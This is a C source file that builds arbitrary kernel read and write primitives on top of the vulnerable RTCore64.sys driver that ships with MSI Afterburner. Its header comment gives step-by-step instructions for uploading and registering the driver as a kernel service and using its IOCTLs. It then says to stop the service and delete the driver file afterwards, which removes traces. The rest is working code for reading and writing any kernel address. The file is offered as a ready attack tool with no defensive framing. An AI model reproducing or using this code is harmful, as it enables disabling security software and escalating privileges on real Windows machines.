/*
 * RTCore64.sys — Kernel Read/Write via Vulnerable Driver
 *
 * RTCore64.sys is distributed with MSI Afterburner and exposes two
 * IOCTLs providing arbitrary kernel-address read and write, both
 * driven by a shared RTCORE64_MEMORY structure.
 *
 * Usage:
 *   1. Upload RTCore64.sys to %SystemRoot%\System32\drivers
 *   2. sc create RTCore64 type= kernel binPath= ... start= demand
 *   3. sc start RTCore64
 *   4. Open handle to \\.\RTCore64
 *   5. Use DeviceIoControl with the read/write IOCTLs
 *   6. sc stop RTCore64 && sc delete RTCore64 && del RTCore64.sys
 */

#include <windows.h>

#define RTCORE64_MEMORY_READ_IOCTL  0x80002048
#define RTCORE64_MEMORY_WRITE_IOCTL 0x8000204C

struct RTCORE64_MEMORY {
    BYTE    Pad0[8];
    DWORD64 Address;
    BYTE    Pad1[8];
    DWORD   ReadSize;    /* also WriteSize */
    DWORD   Value;
    BYTE    Pad3[16];
};

/* Read a DWORD from a kernel address */
DWORD KernelRead(HANDLE hDriver, DWORD64 target_kernel_address) {
    struct RTCORE64_MEMORY r = {0};
    r.Address  = target_kernel_address;
    r.ReadSize = sizeof(DWORD);
    DWORD bytesReturned = 0;
    DeviceIoControl(hDriver, RTCORE64_MEMORY_READ_IOCTL,
                    &r, sizeof(r), &r, sizeof(r), &bytesReturned, NULL);
    return r.Value;
}

/* Write a DWORD to a kernel address */
void KernelWrite(HANDLE hDriver, DWORD64 target_kernel_address, DWORD new_value) {
    struct RTCORE64_MEMORY w = {0};
    w.Address  = target_kernel_address;
    w.ReadSize = sizeof(DWORD);  /* WriteSize */
    w.Value    = new_value;
    DWORD bytesReturned = 0;
    DeviceIoControl(hDriver, RTCORE64_MEMORY_WRITE_IOCTL,
                    &w, sizeof(w), &w, sizeof(w), &bytesReturned, NULL);
}
